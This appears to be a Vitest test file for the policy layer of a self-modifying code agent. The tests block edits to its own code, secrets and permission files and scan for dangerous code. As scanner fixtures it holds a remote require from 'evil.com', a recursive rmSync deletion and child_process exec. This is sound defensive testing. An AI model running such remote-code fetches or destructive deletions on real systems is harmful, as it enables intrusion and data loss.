// ─── Policy Tests ───────────────────────────────────────────────────────────
import { describe, it, expect } from 'vitest';
import { isPathAllowed, checkModificationScope, scanCode, DEFAULT_POLICY } from '../policy.js';
import type { ModificationPolicy } from '../types.js';

describe('isPathAllowed', () => {
  it('应该拒绝 self-iteration 路径（自身不可修改）', () => {
    const result = isPathAllowed('src/self-iteration/modifier.ts', DEFAULT_POLICY);
    expect(result.allowed).toBe(false);
    expect(result.reason).toContain('不可修改');
  });

  it('应该拒绝 .env 文件', () => {
    const result = isPathAllowed('.env', DEFAULT_POLICY);
    expect(result.allowed).toBe(false);
  });

  it('应该拒绝 package.json', () => {
    const result = isPathAllowed('package.json', DEFAULT_POLICY);
    expect(result.allowed).toBe(false);
  });

  it('应该拒绝 permission 路径', () => {
    const result = isPathAllowed('src/permission/index.ts', DEFAULT_POLICY);
    expect(result.allowed).toBe(false);
  });

  it('应该允许 src/tools/ 下的文件（不在 immutablePaths 且 allowedPaths 为空）', () => {
    const result = isPathAllowed('src/tools/newTool.ts', DEFAULT_POLICY);
    expect(result.allowed).toBe(true);
  });

  it('应该允许 src/index.ts（不在 immutablePaths glob 中）', () => {
    const result = isPathAllowed('src/index.ts', DEFAULT_POLICY);
    expect(result.allowed).toBe(true);
  });

  it('空 allowedPaths 应该允许非 immutable 的路径', () => {
    const policy: ModificationPolicy = {
      immutablePaths: ['secret/**'],
      allowedPaths: [],
      maxFilesPerChange: 5,
      maxLinesPerFile: 500,
      maxTotalDiffLines: 1000,
    };
    const result = isPathAllowed('src/anything.ts', policy);
    expect(result.allowed).toBe(true);
  });

  it('有 allowedPaths 时应该只允许白名单路径', () => {
    const policy: ModificationPolicy = {
      immutablePaths: [],
      allowedPaths: ['src/tools/**'],
      maxFilesPerChange: 5,
      maxLinesPerFile: 500,
      maxTotalDiffLines: 1000,
    };
    expect(isPathAllowed('src/tools/a.ts', policy).allowed).toBe(true);
    expect(isPathAllowed('src/config/b.ts', policy).allowed).toBe(false);
  });
});

describe('checkModificationScope', () => {
  it('应该拒绝超过文件数限制的修改', () => {
    const files = Array.from({ length: 20 }, (_, i) => `src/tools/f${i}.ts`);
    const result = checkModificationScope(files, 100, DEFAULT_POLICY);
    expect(result.allowed).toBe(false);
    expect(result.reason).toContain('文件数');
  });

  it('应该拒绝超过总行数限制的修改', () => {
    const result = checkModificationScope(['src/tools/big.ts'], 2000, DEFAULT_POLICY);
    expect(result.allowed).toBe(false);
    expect(result.reason).toContain('行数');
  });

  it('应该允许合理范围内的修改', () => {
    const result = checkModificationScope(['src/tools/a.ts', 'src/tools/b.ts'], 200, DEFAULT_POLICY);
    expect(result.allowed).toBe(true);
  });
});

describe('scanCode', () => {
  it('应该检测 eval 调用', () => {
    const result = scanCode('const x = eval("1+1");', 'test.ts');
    expect(result.safe).toBe(false);
    expect(result.violations.length).toBeGreaterThan(0);
  });

  it('应该检测 new Function 构造', () => {
    const result = scanCode('const fn = new Function("return 1");', 'test.ts');
    expect(result.safe).toBe(false);
  });

  it('应该检测远程 require', () => {
    const result = scanCode('require("https://evil.com/hack.js")', 'test.ts');
    expect(result.safe).toBe(false);
  });

  it('应该允许安全的代码', () => {
    const safeCode = `
      import { readFileSync } from 'fs';
      const data = readFileSync('./config.json', 'utf-8');
      console.log(JSON.parse(data));
    `;
    const result = scanCode(safeCode, 'test.ts');
    expect(result.safe).toBe(true);
    expect(result.violations).toHaveLength(0);
  });

  it('应该检测 child_process 导入', () => {
    const result = scanCode('import { exec } from "child_process";', 'test.ts');
    expect(result.safe).toBe(false);
  });

  it('应该检测 rmSync 调用', () => {
    const result = scanCode('fs.rmSync("/important", { recursive: true });', 'test.ts');
    expect(result.safe).toBe(false);
  });
});
